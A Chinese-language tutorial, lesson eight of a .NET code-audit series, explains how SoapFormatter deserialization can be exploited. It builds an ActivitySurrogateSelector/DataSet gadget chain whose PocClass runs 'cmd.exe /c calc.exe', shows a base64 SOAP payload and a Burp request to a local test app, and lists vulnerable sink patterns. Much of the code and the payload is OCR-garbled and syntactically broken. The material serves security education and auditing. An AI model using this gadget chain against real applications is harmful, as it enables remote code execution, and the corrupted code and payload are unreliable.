<!--
Source: G:\tmp\安全项目研究\.netskill\.NET高级代码审计（第八课） SoapFormatter反序列化漏洞.pdf-4c42771a-2340-4b56-b179-24a5d28eee24\full.md
Archived as: SoapFormatter raw lesson material
Purpose: provenance-only reference for authorized .NET code audit skill development.
Do not load by default; prefer structured references unless exact source context is needed.
-->
.NET 高级代码审计（第八课）SoapFormatter 反序列化漏洞

Ivan1ee@360 天眼云影实验室

2018 年 03 月 01 日

# 0x00 前言

SoapFormatter 格式化器和下节课介绍的 BinaryFormatter 格式化器都是.NET 内部实现的序列化功能的类，SoapFormatter 直接派生自 System.Object，位于命名空间System.Runtime.Serialization.Formatters.Soap，并实现 IRemotingFormatter、IFormatter 接口，用于将对象图持久化为一个 SOAP 流，SOAP 是基于 XML 的简易协议，让应用程序在 HTTP 上进行信息交换用的。但在某些场景下处理了不安全的 SOAP流会造成反序列化漏洞从而实现远程 RCE 攻击，本文笔者从原理和代码审计的视角做了相关介绍和复现。

# 0x01 SoapFormatter 序列化

SoapFormatter 类实现的 IFormatter 接口中定义了核心的 Serialize 方法可以非常方便的实现.NET 对象与 SOAP 流之间的转换，可以将数据保存为 XML 文件，官方提供了两个构造方法。

![](images/ff1529a18e46279f1ff75ca475ce238d30df21fb2c91bc67fb18c383b2ece4a1.jpg)

下面还是用老案例来说明问题，首先定义 TestClass 对象

[Serializable]   
public class TestClass{ private string classname; private string name; private int age; public string classname { get $\Rightarrow$ classname; set $\Rightarrow$ classname $=$ value;} public string Name { get $\Rightarrow$ name; set $\Rightarrow$ name $=$ value;} public int Age { get $\Rightarrow$ age; set $\Rightarrow$ age $=$ value;} public override stringToString() { return base.ToString(); } public static void ClassMethod( string value) { Process.Start(value); }

定义了三个成员，并实现了一个静态方法 ClassMethod 启动进程。 序列化通过创建对象实例分别给成员赋值

```txt
TestClass testClass = new TestClass();
testClass.Age = 18;
testClass.Name = "Ivan1ee";
testClass.Classname = "360";
FileStream stream = new FileStream(@"d:\soap.xml", FileMode.Create);
SoapFormatter bFormat = new SoapFormatter();
bFormat SZerlize(stream, testClass);
stream.Close(); 
```

常规下使用 Serialize 得到序列化后的 SOAP 流，通过使用 XML 命名空间来持久化原始程序集，例如下图 TestClass 类的开始元素使用生成的 xmlns 进行限定，关注 a1 命名空间

```txt
<SOAP-ENV:Envelope  
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"  
xmlns:SOAP-  
ENV="http://schemas.xmlsoap.org/soap/envelope/"  
xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-
```

```txt
ENV:encodingStyle="http://schemas.xmIsoap.org/soap/encoding/"   
<SOAP-ENV:Body>   
<a1:TestClass id="ref-1"   
xmlns:a1="http://schemas.microsoft.com CLR/nsassem/WpfAp   
p1/WpfApp1%2C%20Version%3D1.0.0.%2C%20Culture%3Dneutral   
%2C%20PublicKeyToken%3Dnull">   
<classname id="ref-3">360</classname>   
"name id="ref-4">Ivan1ee</name>   
<age>18</age>   
</a1:TestClass>   
</SOAP-ENV:Body>   
</SOAP-ENV:Envelope> 
```

# 0x02 SoapFormatter 反序列化

# 2.1、反序列化用法

SoapFormatter 类反序列化过程是将 SOAP 消息流转换为对象，通过创建一个新对象的方式调用 Deserialize 多个重载方法实现的，查看定义得知实现了

IRemotingFormatter、IFormatter 接口，

```cs
using   
namespace System.Runtime.EventArgs.Formatters.Soap   
{ public sealed class SoapFormatter : IRemotingFormatter, IFormatter   
public SoapFormatter(); public SoapFormatter(ISurrogateSelector selector, StreamingContext context); public ISoapMessage TopObject { get; set; } public FormatterTypeStyle TypeFormat { get; set; } public FormatterAssemblyStyle AssemblyFormat { get; set; } public TypeFilterLevel FilterLevel { get; set; } public ISurrogateSelector SurrogateSelector { get; set; } public serializationBinder Binder { get; set; } public StreamingContext Context { get; set; } public object DeserializationStream serializationStream); public object DeserializationStream serializationStream,HeaderHandler handler); public void serialize(Stream serializationStream,object graph); public void serialize(Stream serializationStream,object graph,Header[] headers);   
} 
```

查看 IRemotingFormatter 接口定义得知也是继承了 IFormatter

```cs
namespace System.Runtime.Remoting Messaging
{
    ..public interface IRemotingFormatter : IFormatter
    {
        ..object Deserialization Stream serializationStream, HeaderHandler handler);
        ..void SZralize(Stream serializationStream, object graph, Header[] headers);
    }
} 
```

笔者通过创建新对象的方式调用 Deserialize 方法实现的具体实现代码可参考以下

```txt
FileStream stream2 = new FileInputStream(@"d:\soap.xml", FileMode.Open);  
SoapFormatter bFormat2 = new SoapFormatter();  
var person = bFormat2.Deserialization(stream2);  
Console.WriteLine((TestClass.person).Name);  
stream2.Close(); 
```

反序列化后得到 TestClass 类的成员 Name 的值。

```batch
D:\Tmp\Csharp\WPF\WpfApp1\WpfApp1\bin\Debug\WpfApp1.exe Ivanlee 
```

# 2.2、攻击向量—ActivitySurrogateSelector

在 SoapFormatter 类的定义中除了构造函数外，还有一个 SurrogateSelector 属性，SurrogateSelector 便是代理选择器，序列化代理的好处在于一旦格式化器要对现有类型的实例进行反序列化，就调用由代理对象自定义的方法。查看得知实现了

ISurrogateSelector 接口，定义如下

```txt
namespace System.Runtime serialization   
{ public interface ISurrogateSelector } .void ChainSelector(ISurrogateSelector selector); .ISurrogateSelectorGetNextSelector(); .ISeraiizationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector); } 
```

因为序列化代理类型必须实现 System.Runtime.Serialization.ISerializationSurrogate接口，ISerializationSurrogate 在 Framework Class Library 里的定义如下：

![](images/a74150e9e91cbe41ad7a5e3cdabb0d617fd3449d888c6dcffb3cb8ce320db40d.jpg)

图 中 的 GetObjectData 方 法 在 对 象 序 列 化时 进 行 调用 ， 目 的 将 值 添 加 到SerializationInfo 集合里，而 SetObjectData 方法用于反序列化，调用这个方法的时候需要传递一个 SerializationInfo 对象引用，换句话说就是使用 SoapFormatter 类的Serialize 方 法 的 时 候 会 调 用 GetObjectData 方 法 ， 使 用 Deserialize 会 调用SetObjectData 方 法 。 SoapFormatter 类 还 有 一 个 非 常 重 要 的 属 性SurrogateSelector，定义如下

![](images/f23b8565de76ce2cc61b999206346e223f2b649ed44131f4f3cf981c42bd7240.jpg)

在序列化对象的时候如果属性 SurrogateSelector 属性的值非 NULL 便会以这个对象的类 型 为 参 数 调 用 其 GetSurrogate 方 法 ， 如 果 此 方 法 返 回 一 个 有 效 的 对 象ISerializationSurrogate，这个对象对找到的类型进行反序列化，这里就是一个关键的地方，我们要做的就是实现重写 ISerializationSurrogate 调用自定义代码，如下 Demo

![](images/466a6718e600db2275d09ac9eedf9608a17be20beb2eadee55e54399f08e7a00.jpg)

代码中判断类型解析器 IsSerializable 属性是否可用，如果可用直接基类返回，如果不可用就获取派生类

System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector 的类 型，然后交给 Activator 创建实例

再回到 GetObjectData 方法体内，另外为了对序列化数据进行完全控制，就需要实现Serialization.ISeralizable 接口，定义如下：

```cs
namespace System.RuntimeSerializedization
{
    ..public interface ISSerializable
    {
        ..void GetObjectData(SerializationInfo info, StreamingContext context);
    }
} 
```

有关更多的介绍请参考《.NET 高级代码审计第二课 Json.Net 反序列化漏洞》，在实现自定义反序列类的时通过构造方法读取攻击者提供的 PocClass 类

```txt
public class PocClass   
{ public PocClass() System.Diagnostics.Process.Start("cmd.exe", "/c calc.exe"); } 
```

下图定义了 PayloadClass 类实现 ISerializable 接口，然后在 GetObjectData 方法里又声明泛型 List 集合接收 byte 类型的数据

[Serializable]   
public class Payloadclass : ISerializable   
{ protected byte[] assemblyBytes; public PayloadClass() { this.assemblyBytes $\equiv$ File.ReadAllBytes(typeofPocclasAssembly.Location); } protected PayloadClass(SerlalizationInfo info, StreamingContext context) { public void GetobjectData(SerlalizationInfo info, StreamingContext context) { Listbyte[]> data $=$ new Listbyte[]>(); data.Add(this.assemblyBytes); var e1 $=$ data.select(Assembly.Load); FuncAssembly, INumerableotypes>> map_type $=$ (Func<Assembly, INumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, INumerable<Type>>), typeof (Assembly).GetMethod("GetTypes")); var e2 $=$ e1.SelectMany(map_type); var e3 $=$ e2.select(Activator.CreateInstance);

将 PocClass 对象添加到 List 集合，声明泛型使用 IEnumerable 集合 map_type 接收程序集反射得到的 Type 并返回 IEnumerable 类型，最后用 Activator.CreateInstance创建实例保存到 e3 此时是一个枚举集合的迭代器。

PagedDataSource pds $=$ new PagedDataSource(){DataSource $\equiv$ e3};   
Dictionary dict $=$ (Dictionary)Activator.CreateInstance(typeof(int).Assembly.Type("System.Routine.Remoting_channels.Aggregatedictionary"),pds);   
DesignerVerb verb $=$ new DesignerVerb("Ivanlee",null);   
typeof（MenuCommand）.GetField("properties"，BindingFlags.NonPublic|BindingFlags Instance).SetValue(verb，dict);   
List<object>ls $=$ new List<object>();   
ls.Add(e1);   
ls.Add(e2);   
ls.Add(e3);   
ls.Add(pds);   
ls.Add(verb);   
ls.Add(dist);   
Hashtableht $=$ new.Hashtable();   
ht.Add(verb，"Hello");   
ht.Add("Dummy","Hi");   
FieldInfo fi_keys $=$ htGetProperty().GetField(" buckets"，BindingFlags.NonPublic|BindingFlagsInstance);   
Array keys $=$ (Array)fi_keys=value(ht);   
FieldInfo fi_key $=$ keysGetProperty().AssignmentType().GetField("key"，BindingFlags.Public|BindingFlagsInstance);   
for (int i $= 0$ ；i<keys.Length;++i)   
{ object bucket $=$ keys增值Value(i); object key $=$ fi_key增值Value(bucket); if (key is string) { fi_key.SetValue(bucket,verb); keys.setvalue(bucket,i); break; }   
}   
fi_keys的价值(ht,key);   
ls.Add(ht);

上图将变量 e3 填充到了分页控件数据源，查看 PageDataSource 类定义一目了然，

```cs
namespace System.Web.UI.WebControls
{
    public sealed class PagedDataSource : ICollection,,IEnumerable,ITypedList
        public PagedDataSource();
    public int PageSize { get; set; }
    public int.PageCount { get; }
    public bool IsSynchronized { get; }
    public bool IsServerPagingEnabled { get; }
    public bool IsReadOnly { get; }
    public bool IsPagingEnabled { get; }
    public bool IsLastPage { get; }
    public bool IsFirstPage { get; }
    public bool IsCustomPagingEnabled { get; }
    public int FirstIndexInPage { get; }
    public int DataSourceCount { get; }
    publicizableDataSourceDataSource { get; set; }
    public int CurrentPageIndex { get; set; }
    public int Count { get; }
    public bool AllowServerPaging { get; set; }
    public bool AllowPaging { get; set; }
    public bool AllowCustomPaging { get; set; }
    public object SyncRoot { get; }
    public int VirtualCount { get; set; }
    public void CopyTo(Array array, int index);
    public Enumerator GetEnumerator();
    public PropertyDescriptorCollection GetItemProperties( PropertyDescriptor[] listAccessors);
    public string GetListItem( PropertyDescriptor[] listAccessors);
} 
```

除此之外 System.Runtime.Remoting.Channels.AggregateDictionary 返回的类型支持 IDictionary，然后实例化对象 DesignerVerb 并随意赋值，此类主要为了配合填充MenuCommand 类 properties 属性的值，最后为哈希表中的符合条件的 buckets 赋值。

FieldInfo fi_keys = ht)bucket).GetField("buckets", BindingFlags.NonPublic | BindingFlags Instance); Array keys $=$ (Array)fi_keys.GetValue(ht); FieldInfo fi_key $\equiv$ keys)bucket).GetElementType().GetField("key", BindingFlags.Public | BindingFlagsInstance); for (int i $= 0$ ;i $<  _{i}$ keys.Length; $+ + 1$ ） { object bucket $\equiv$ keys.Values(i); object key $\equiv$ fi_key.Values(bucket); if (key is string) { fi_keySetValue(bucket,verb); keysSetValue(bucket,i); break; }   
fi_keysSetValue(ht,keys);

接下来用集合添加数据源 DataSet，DataSet 和 DataTable 对象继承自

System.ComponentModel.MarshalByValueComponent 类，可序列化数据并支持远程处理 ISerializable 接口，这是 ADO.NET 对象中仅有支持远程处理的对象，并以二进制格式进行持久化。

![](images/27bcc1a1c0a8b275b4759b9f2c6260564c28af15b0ca95a67bff179b59c42c67.jpg)

更改属性 DataSet.RemotingFormat 值为 SerializationFormat.Binary，更改属性DataSet.CaseSensitive 为 false 等，再调用 BinaryFormatter 序列化 List 集合，如下图。

```matlab
info.Type(typeof(System.Data.DataSet));  
info.AddValue("DataSet.RemotingFormat", System.DataSERIALIZATIONFormat(Binary));  
info.AddValue("DataSet.DataSetName", "")；  
info.AddValue("DataSet.Nospace",""));  
info.AddValue("DataSet Prefix",""));  
info.AddValue("DataSet.CaseSensitive", false);  
info.AddValue("DataSet.LocaleLCID", 0x409);  
info.AddValue("DataSet.EnforceConstraints", false);  
info.AddValue("DataSet_EXTENDEDProperties", (PropertyCollection)null);  
info.AddValue("DataSet.Tables.Count", 1);  
BinaryFormatter fmt = new BinaryFormatter();  
MemoryStream stm = new MemoryStream();  
fmt.SurrogateSelector = new MySurrogateSelector();  
fmt SZerlize stm, ls);  
info.AddValue("DataSet.Tables_0", stm.ToArray()); 
```

因为指定了 RemotingFormat 属性为 Binary，所以引入了 BinaryFormatter 格式化器并指定属性 SurrogateSelector 代理器为自定义的 MySurrogateSelector 类。序列化后得到 SOAP-XML，再利用 SoapFormatter 对象的 Deserialize 方法解析读取文件内容的流数据，成功弹出计算器

```txt
SOAP-EN:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.orgSOAP/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.orgSOAP/envelope/" xmlns:clr="http://schemas.microsoft.comSOAP/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.orgSOAP/encoding/"   
<SOAP-ENV:Body>   
<1:DataSet id="ref-1"   
xml:at="http://schemas.microsoft.com/crl/nsassem/System.Data/System.Data%2c%20Version%3d4.0.0.0%2c%20Culture%3dNeutral%2c%20PublicKeyToken%3db77a5c561934e089">   
<DataSet.RemotingFormat xsi:type="a1:SerializableFormat"   
xml:at="http://schemas.microsoft.com/crl/nsassem/System.Data/System.Data%2c%20Version%3d4.0.0.0%2c%20Culture%3dNeutral%2c%20PublicKeyToken%3db77a5c561934e089">Binary   
</DataSet.RemotingFormat>   
<DataSet.DataSetName id="ref-3"></DataSet.DataSetName>   
<DataSet Namespace href="ref-3"/>   
<DataSet Prefix href="/#ref-3"/>   
<DataSet.Casesensitive>false</DataSet.Casesensitive>   
<DataSet LocaleIDX1033</DataSet LocaleID>   
<DataSet.EnforceConstraints>false</DataSet.EnforceConstraints>   
<DataSetExtendedProperties xsi:type="xsd:anyType" xsi:null="1"/>   
<DataSet.Tables.Count>1</DataSet.Tables.Count>   
<DataSet.Tables_0 href="/#ref-4"/>   
</Dataset;   
<SOAP-ENC:Array id="ref-4"   
xsi:type="SOAP-ENC:=base64"AAAAAAD////QAAAAAAAAAEEAAH9TeXN0/W6UQ9bSgVjdgG1vbnMURZuUZxJPySbXM9YDFbIMN5c3Rb5B5PYmply3Qs1G1z2y9bglCIMZxJzauNHPQTUMQNCwLJAS1EN1BHR1   
cmBnVJlDthBcwGnuhVibGlsJzS2VSVG9rZW49Yjc3AYTVNTyXOTMIZTA4OVIIDAAAAAZfaXRlbXfX3NpemUX3ZlcnPb24FAAATCAKCAAABwAAACAAAGAAAGAAJAAAWAAKCAAAACQUAAAAJBGAAAAKHAAACQg   
MAAJCQAAMCgPAAGFTEXN0/W6UVZ9a22s3bcqZ9CTG9UZW50W9skwIISF2LCnPb249NCawLJAUKCWgV3dsHV2T1UZXV0cmfSLCBQdW3saMLX2XUBt2lbj6ZMfMtzgTImkATyzOVTBN1BQAAWqBQ31zdgVtll   
Vmcntb69bklKnBvBhVvUdVgVLsINlCMlb6LgYpkb24QUNxAzPdHdldxjybdVdGhZxLYRvCytMpYlp3R1dxjybdDour12QzGNWU2yVyAFSaSPzflZlZGIAAAEdhlWzQtZMIZXZJEYRKrWchH1N5c   
BRL5B5vm10evnVcmhG6YxRp25t2bkZkXIIAKAQCQAAAAEAAAAAIAAAAAACQQAAAABBQAAAAAIAAAJdwAAAQQAAAQAAADAAAADCRAAAAJEGAAAAEHHAAAAAAAAAKTAAAAACRQAABCAAAAA 
```

```javascript
FileStream stream2 = new FileInputStream(@"d:\o.xml", FileMode.Open);  
SoapFormatter bFormat2 = new SoapFormatter();  
var person = bFormat2.Deserialization(stream2);  
stream2.Close(); 
```

![](images/10020d039a30914e586f835f1b0666e16a6eae4cc444469ca778a36237bc864d.jpg)

# 2.3、攻击向量—PSObject

由于笔者的 Windows 主机打过了 CVE-2017-8565（Windows PowerShell 远程代码执行漏洞）的补丁，利用不成功，所以在这里不做深入探讨，有兴趣的朋友可以自行研究。有关于补丁的详细信息参考：

```txt
https://support.microsoft.com/zh-cn/help/4025872.windows-powershell-remote-code-execution-vulnerability 
```

# 0x03 代码审计视角

# 3.1、XML 载入

从代码审计的角度找到漏洞的 EntryPoint，传入 XML，就可以被反序列化，这种方式也是很常见的，需要关注一下，LoadXml 直接载入 xml 数据，这个点也可以造成 XXE漏洞。例如这段代码：

public class SoapSerializerHelper   
{ /// <summary> /// Deserialization Soap string to object. /// </summary> /// <param name $=$ "source">The Soap string to(deserialization.</param> /// <returns>Instance of object.</returns> public static object Deserialization(string source) { if (string.IsNullOrEmpty.source)) { throw new ArgumentNullException("source"); } xmlDocument xmlDocument $\equiv$ new XmlDocument(); xmlDocument.LoadXml.source); SoapFormatterSOAPFormatter $\equiv$ new SoapFormatter(); using (MemoryStream memoryStream $\equiv$ new MemoryStream()) { xmlDocument.SavememoryStream); memoryStream.Position $\equiv$ 0; return soapFormatter.Deserialization记忆Stream); } }

这种污染点漏洞攻击成本很低，攻击者只需要控制传入字符串参数 source 便可轻松实现反序列化漏洞攻击，弹出计算器。

```txt
Burg Instruder Repeater Window Help
Target Proxy Spider Scanner Intruder Repeater Sequencer Decoder Comparator Extended Project options User options Alerts CSRF
1 .. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
Go Cancel < >.
Request
Raw Params Headers Hex
POST http://localhost:5651/default HTTP/1.1
Host: localhost:5651
User-Agent: Mozilla/5.0 (Windows NT 6.1; WDW64; rv:49.0; Gecko/01D0101 Firefox/49.0
Accept: text/html,application/xml, application/xml;q=0.9, */*q=0.0
Accept-Language: zh-CR, zh-GB, en-ES; q=0.5, en-q=0.3
Accept-Encoding: gzip, deflate
Cookie: ECS[visit段时间]=i_ga=Gai.1.1578344208,1524306675; AspNett Consent=yes
BUT: I
X-Forwarded-For: 0.8.8.8
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded encoded
Content-Length: 102189
value="SOAP-ENvelope xmlns:xsi="http://www.wl.org/1/2001/XMLSchema-instance"
xmlns:xsi="http://www.wl.org/1/2001/XMLSchema-instance"
xmlns:xsi="http://www.wl.org/1/2001/XMLSchema-instance"
xmlns:xsi=SOAP-EN"http://schemos.com/cmxml.asp?_id=1&xsi=SOAP-EN&mode=1&class=1&dataSetID=1&d=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1& ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&ds=1&dtsetTableData:=DataSetLocateLcID: 1033</Dataset.LocalLeIDC>DataSet.EnforceConstraints>false</Dataset DataSet.EnforceConstraints>DataSetExtendedProperties
xs:string="xsanyType" xsname="//<Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> </Dataset.Tables.Count> 
\xms:string="https://www.eia.hong-kong.gov.cn/2008/26/26b7j0gJvHmVbUeVZuQyTsySMySQNMOYDFVJU 
NSCIRI BSSPFTCTGCEGTTGQyGJyHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQyGJyHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQyGJyHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQ yHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMySQNMOYDFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMySQNMOYdfT 
JVTNTO/NTO=BEX/NEA/HK/NTC/EW/2087026876f78gJvHmVbUeVZuQyTsySMyQFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMyQFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMyQFVJU 
NCSIRI BSSPFTCTGCEGTTGQyHmVbUeVZuQyTsySMyQFVJU 
NCSIRI AALMAA/DAMRAA/CAGAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GCAAAAC/GcaAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGAAGA 
```

# 3.2、File 读取

public static object DeserializationSOAP(string path)   
{ FileStream fs $=$ File.Open(path,FileMode.Open); SoapFormatter soapFormatter $\equiv$ new SoapFormatter(); var course $=$ soapFormatter.Deserialization(fs); fs.close(); return course;

这段是摘自某个应用的代码片段，在审计的时候只需要关注 DeserializeSOAP 方法中传入的 path 变量是否可控。

# 0x04 总结

实际开发中 SoapFormatter 类从.NET Framework 2.0 开始，这个类已经渐渐过时了，开发者选择它的概率也越来越少，官方注明用 BinaryFormatter 来替代它，下篇笔者接着来介绍 BinaryFormatter 反序列化漏洞。最后.NET 反序列化系列课程笔者会同步到 https://github.com/Ivan1ee/ 、https://ivan1ee.gitbook.io/ ，后续笔者将陆续推出高质量的.NET 反序列化漏洞文章，欢迎大伙持续关注，交流，更多的.NET 安全和技巧可关注实验室公众号。
